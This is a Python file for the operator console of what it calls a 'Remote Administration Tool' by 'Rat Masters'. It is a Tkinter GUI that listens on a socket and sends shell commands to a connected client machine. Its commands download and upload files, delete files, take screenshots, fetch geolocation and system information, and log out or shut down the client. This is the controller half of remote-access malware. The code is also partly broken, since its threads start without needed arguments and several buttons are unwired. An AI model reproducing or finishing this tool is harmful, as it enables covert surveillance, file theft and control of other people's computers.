import subprocess
import tkinter as tk
from tkinter import BOTH, END
from tkinter.messagebox import showinfo
import socket
import threading
import time
import os
socket.setdefaulttimeout(15)


HOST = '172.20.16.61'
PORT = 80

class AdminWindow():
    """Server side, admin user GUI window """
    def __init__(self, host, port):
        # configure the root window
        self.admin = tk.Tk()
        self.admin.title('Admin Window')
        self.admin.iconbitmap('icons/rat.ico')
        self.admin.geometry('1200x900+200+50')
        self.admin.config(bg='black')
        self.admin.resizable(0,0)        
        
        # setting layout frames
        self.header_frame = tk.Frame(self.admin, width=1200, height=100, bg='black')
        self.midle_frame = tk.Frame(self.admin,width=1200, height=800, bg='black')
        self.midle_left_frame = tk.Frame(self.midle_frame, width=750, height=700, bg='black', highlightbackground='lightgreen', highlightcolor='lightgreen', highlightthickness=2, bd=0)
        self.midle_right_frame = tk.Frame(self.midle_frame, width=350, height=700, bg='black', highlightbackground='lightgreen', highlightcolor='lightgreen', highlightthickness=2, bd=0)
        self.footer_frame = tk.Frame(self.admin, width=1200, height=50, bg='black')
        self.header_frame.pack()
        self.midle_frame.pack()
        self.midle_left_frame.grid(row=0, column=1, padx = (25,0), pady= (20,25), sticky='w')
        self.midle_right_frame.grid(row=0, column=2, padx = 25, pady= (20,25), sticky='e')
        self.footer_frame.pack()

        # header labels
        self.header_label_1 = tk.Label(self.header_frame, text='Remote Administration Tool', bg='black', fg='white', font=('helvetica', 25))
        self.rat_image = tk.PhotoImage(file='pictures/rat.png')
        self.header_label_2 = tk.Label(self.header_frame, image=self.rat_image, bg='black')
        self.header_label_1.grid(row=0, column=0, padx=20)
        self.header_label_2.grid(row=0, column=1, padx=20, ipadx=10, ipady=10)

        # midle labels and buttons
        self.midle_left_label_1 = tk.Label(self.midle_left_frame, text='Shell', bg='black', fg='white', font=('helvetica', 15))
        self.midle_left_label_1.pack(pady=10)
        self.midle_left_text = tk.Text(self.midle_left_frame, width=100, height=30, bg='black', fg='lightgreen', font=('helvetica',  10), insertbackground='lightgreen')
        self.midle_left_text.pack(padx=10, pady=10)
        self.midle_left_label_2 =  tk.Label(self.midle_left_frame, text='Command', bg='black', fg='white', font=('helvetica', 15))
        self.midle_left_label_2.pack(pady=5)
        self.midle_left_command = tk.Entry(self.midle_left_frame, width=100, bg='black', fg='lightgreen', font=('helvetica', 10), insertbackground='lightgreen')
        self.midle_left_command.pack(padx=5, pady=(5,10))
        self.midle_left_bottom_frame = tk.Frame(self.midle_left_frame, bg='black', width=700, height=145)
        self.midle_left_bottom_frame.pack()
        self.midle_left_bottom_shell_button = tk.Button(self.midle_left_bottom_frame, width=13, text='Pro User', bg='lightgreen', fg='black', font=('helvetica', 15), command=self.pro)
        self.midle_left_bottom_shell_button.grid(row=0, column=1, padx=10, pady=(10, 20))
        self.midle_left_bottom_data_button = tk.Button(self.midle_left_bottom_frame, width=13, text='Database', bg='lightgreen', fg='black', font=('helvetica', 15))
        self.midle_left_bottom_data_button.grid(row=0, column=2, padx=10, pady=(10, 20))
        self.midle_left_bottom_info_button = tk.Button(self.midle_left_bottom_frame, width=13, text='Info / settings', bg='lightgreen', fg='black', font=('helvetica', 15))
        self.midle_left_bottom_info_button.grid(row=0, column=3, padx=10, pady=(10, 20))
        self.midle_left_bottom_exit_button = tk.Button(self.midle_left_bottom_frame, width=13, text='Exit', bg='orange', fg='black', font=('helvetica', 15), command=self.admin.destroy)
        self.midle_left_bottom_exit_button.grid(row=0, column=4, padx=10, pady=(10, 24))
        self.midle_left_command.bind('<Return>', lambda event:self.shell())        

        self.midle_right_label_1 = tk.Label(self.midle_right_frame, text='Chat', bg='black', fg='white', font=('helvetica', 15))
        self.midle_right_label_1.pack(pady=10)
        self.midle_right_text = tk.Text(self.midle_right_frame, width=40, height=16, bg='black', fg='lightgreen', font=('helvetica',  10), insertbackground='lightgreen')
        self.midle_right_text.pack(padx=10, pady=10)
        self.midle_right_label_2 =  tk.Label(self.midle_right_frame, text='Message', bg='black', fg='white', font=('helvetica', 15))
        self.midle_right_label_2.pack(pady=5)
        self.midle_left_message = tk.Entry(self.midle_right_frame, width=40, bg='black', fg='lightgreen', font=('helvetica', 10), insertbackground='lightgreen')
        self.midle_left_message.pack(padx=5, pady=5)
        self.midle_right_label_3 = tk.Label(self.midle_right_frame, text='Client quick buttons', bg='black', fg='white', font=('helvetica', 15))
        self.midle_right_label_3.pack(pady=10)
        self.midle_right_location_button = tk.Button(self.midle_right_frame, width=15,  text='Location', bg='lightgreen', fg='black', font=('helvetica', 15))
        self.midle_right_location_button.pack(padx=10, pady=10)
        self.midle_right_screenshot_button = tk.Button(self.midle_right_frame, width=15,  text='Screenshot', bg='lightgreen', fg='black', font=('helvetica', 15))
        self.midle_right_screenshot_button.pack(padx=10, pady=10)
        self.midle_right_logout_button = tk.Button(self.midle_right_frame, width=15,  text='Logout Client', bg='orange', fg='black', font=('helvetica', 15))
        self.midle_right_logout_button.pack(padx=10, pady=10)
        self.midle_right_shutdown_button = tk.Button(self.midle_right_frame, width=15,  text='Shutdown Client', bg='red', fg='black', font=('helvetica', 15))
        self.midle_right_shutdown_button.pack(padx=10, pady=(10, 20))
        
        # footer label
        self.footer_label_1 = tk.Label(self.footer_frame, text='by Rat Masters', bg='black', fg='white', font=('helvetica', 10))
        self.footer_label_1.pack()
        
        self.midle_right_text.insert("1.0", "Hello from Rat masters!\nWelcome!\n")
        #self.midle_left_text.insert("end" , )

        #IP, Port, socket and threads
        self.host = host
        self.port = port
        # self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)

        # self.listener.bind((self.host, self.port))
        # self.listener.listen(1)        
        # self.midle_left_text.insert('1.0', '\nRunning Rat Server...')
        # self.connection, address = self.listener.accept()
        # self.midle_left_text.insert('1.0', f'\nNew connection from {address[0]}\n')

        self.shell_thread = threading.Thread(target=self.shell).start()        
        # self.chat_thread = threading.Thread(target=self.chat).start()        
        # self.pro_user_thread = threading.Thread(target=self.pro_user).start()      
        self.send_thread = threading.Thread(target=self.send_data).start()
        self.recv_thread = threading.Thread(target=self.recv_data).start()
        #self.gui_thread = threading.Thread(target=self.admin.mainloop).start()

        self.admin.mainloop()         

    def pro(self):
        self.admin.destroy()
        os.system('python server_new.py')
        #subprocess.run(['python','server_new.py'])

        
    def clear_screen(self):
        self.midle_left_text.delete(0,END)

    def send_data(self, output_data):
        size_of_data = str(len(output_data))
        self.connection.send(bytes(size_of_data,'utf-8'))
        time.sleep(1)
        self.connection.send(output_data)

    def recv_data(self):
        original_size = self.connection.recv(2048).decode('utf-8')
        original_size = int(original_size)
        data = self.connection.recv(2048)
        while len(data) != original_size:
            data = data + self.connection.recv(2048)
        return data

    def command(self):
        com = self.midle_left_command.get()
        self.midle_left_command.delete(0, END)
        return com
        
       
    def shell(self):       
        """Shell box functionality"""

       
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)

        self.listener.bind((self.host, self.port))
        self.listener.listen(1)        
        self.midle_left_text.insert('1.0', '\nRunning Rat Server...')
        self.connection, address = self.listener.accept()
        self.midle_left_text.insert('1.0', f'\nNew connection from {address[0]}\n')

    
        cmd = self.command()  
        self.connection.send(bytes(cmd, 'utf8'))            
        if cmd == 'exit':
            self.connection.close()
            self.listener.close()
            self.midle_left_text.insert('1.0', f'\nClosing Rat Server...\n')
            
        elif cmd == 'cls':
            self.clear_screen()
           
        elif cmd[:2] == 'cd':
            result = self.recv_data().decode('utf-8')
            self.midle_left_text.insert('1.0', result)
            
        elif cmd[:8] == 'download':
            file_output = self.recv_data()
            if file_output == b'not found':
                self.midle_left_text.insert('1.0', 'No file')
               
            with open(cmd[9:], 'wb') as write_data:
                write_data.write(file_output)
            
        elif cmd[:6] == 'upload':
            try:
                with open(cmd[7:], 'rb') as data:
                    data_read = data.read()
            except FileNotFoundError:
                self.midle_left_text.insert('1.0', 'File not found')
            else:
                self.send_data(data_read)
           
        elif cmd == 'screen':
            self.midle_left_text.insert('1.0', 'taking screenshot')
            
        elif cmd[:6] == 'delete':
            self.midle_left_text.insert('1.0', self.recv_data().decode("utf-8"))
           
        elif cmd == 'geo':
            self.midle_left_text.insert('1.0',self.recv_data().decode("utf-8"))
            
        elif cmd == 'sysinfo':
            self.midle_left_text.insert('1.0',self.recv_data().decode("utf-8"))
            
        elif cmd == '':
            pass          

        output = self.recv_data().decode('ISO-8859-1')
        self.midle_left_text.insert('1.0', output)

    def chat(self):
        """Chat box functionality"""
        pass

    def pro_user(self):
        """Launching shell only"""
        pass


AdminWindow('172.20.16.61', 80)
